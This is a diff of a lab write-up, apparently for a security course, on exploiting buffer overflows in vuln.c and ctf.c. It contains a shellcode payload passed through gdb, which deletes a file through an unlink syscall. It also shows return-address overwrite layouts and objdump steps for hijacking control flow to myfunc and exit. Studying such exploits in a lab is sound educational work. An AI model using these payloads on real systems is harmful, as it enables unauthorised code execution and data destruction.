@@ -27,19 +27,24 @@ Get shellcode: `for i in $(objdump -d file_del |grep "^ " |cut -f2); do echo -n 
 --> We remove \xdummyfile because it is not meaningful hexadecimal code
 
 **Stack Frame:**
+
 ![alt text](./image/image-14.png)
 
 - Shell code: `36 bytes`
 - Return address: `4 bytes`
 --> placement code: `32 bytes`
+
 Here, we will use the vuln.c program to trigger a buffer overflow
 
 **Connect to gdb**
+
 ![alt text](./image/image-15.png)
+
 - Break in this position to see the change
 `b *0x0804846b`
 
 - Run the program by using command:
+
 >r $(python -c "print('\xeb\x13\xb8\x0a\x00\x00\x00\xbb\x7a\x80\x04\x08\xcd\x80\xb8\x01\x00\x00\x00\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x00'+'a'*32+'\xff\xff\xff\xff')")
 
 ![alt text](./image/image-16.png)
@@ -92,7 +97,6 @@ At this point, the program will likely report an error because it cannot find th
 
 As we can see, the dummyfile is **start from** `0xffffd672` **not from** `0x080407a` in C program!
 - We need to set 0xffffd651 to point at that using command: 
-
 `set *0xffffd661 = 0xffffd672`
 
 ![alt text](./image/image-26.png)
@@ -105,6 +109,7 @@ As we can see, the dummyfile is **start from** `0xffffd672` **not from** `0x0804
 
 
 ## Task 2: Conduct attack on ctf.c
+
 **Source code:**
 
 ![alt text](./image/image-30.png)
@@ -118,6 +123,7 @@ As we can see, the dummyfile is **start from** `0xffffd672` **not from** `0x0804
 `(buf[100] + ebp(4) + ReturnA(rewrite by the myfunc's address) + s + p + q)`
 
 = `104(padding) + the myfunc's address + 4(padding) + p(value) + q(value)`
+
 **Run the virtual environment by docker file**
 
 ![alt text](./image/image-32.png)
@@ -128,11 +134,11 @@ As we can see, the dummyfile is **start from** `0xffffd672` **not from** `0x0804
 
 ![alt text](./image/image-32.png)
 
-**Get the myfunc's address by this command:**
-
+**Get the address of the myfunc function by this command:**
 `objdump -d ctf.out|grep myfunc`
 
 ![alt text](./image/image-33.png)
+
 --> So we obtain the address of the myfunc funtion: `0804851b`
 
 **Connect gdb and run by this command:**
@@ -147,7 +153,9 @@ As we can see, the dummyfile is **start from** `0xffffd672` **not from** `0x0804
 
 **Get the exit's address**
 `objdump -d ctf.out|grep exit`
+
 ![alt text](./image/image-35.png)
+
 --> So we obtain the address of the exit: `080483e0`
 
 **Connect gdb and run again by this command:**
@@ -156,6 +164,7 @@ As we can see, the dummyfile is **start from** `0xffffd672` **not from** `0x0804
 ![alt text](./image/image-36.png)
 
 --> We've done this lab
+
 **Stack frame:**
 
 ![alt text](./image/image-29.png)
